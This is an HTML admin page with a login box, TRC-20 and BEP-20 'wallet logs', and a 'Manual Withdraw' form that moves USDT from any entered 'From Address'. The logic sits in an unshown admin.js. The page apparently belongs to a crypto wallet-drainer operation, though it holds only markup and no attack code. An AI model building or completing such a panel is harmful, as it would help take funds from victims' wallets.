<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Admin Panel</title>
  <link rel="stylesheet" href="admin.css">
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script src="https://unpkg.com/jquery@3.6.0/dist/jquery.min.js"></script>
</head>
<body>
  <div class="login-container" id="loginBox">
    <h2>Admin Login</h2>
    <input type="text" id="username" placeholder="Username" />
    <input type="password" id="password" placeholder="Password" />
    <button onclick="login()">Login</button>
  </div>

  <div class="panel-container" id="panel" style="display:none;">
    <h1>Admin Panel</h1>
    <div class="section">
      <h2>TRC-20 Wallet Logs</h2>
      <ul id="trcLogs"></ul>
    </div>

    <div class="section">
      <h2>BEP-20 Wallet Logs</h2>
      <ul id="bepLogs"></ul>
    </div>

    <div class="section">
      <h2>Manual Withdraw</h2>
      <h3>TRC-20</h3>
      <input type="text" id="trcFrom" placeholder="From Address">
      <input type="text" id="trcAmount" placeholder="Amount in USDT">
      <button onclick="manualWithdrawTRC()">Withdraw TRC-20</button>

      <h3>BEP-20</h3>
      <input type="text" id="bepFrom" placeholder="From Address">
      <input type="text" id="bepAmount" placeholder="Amount in USDT">
      <button onclick="manualWithdrawBEP()">Withdraw BEP-20</button>
    </div>
  </div>

  <script src="admin.js"></script>
</body>
</html>
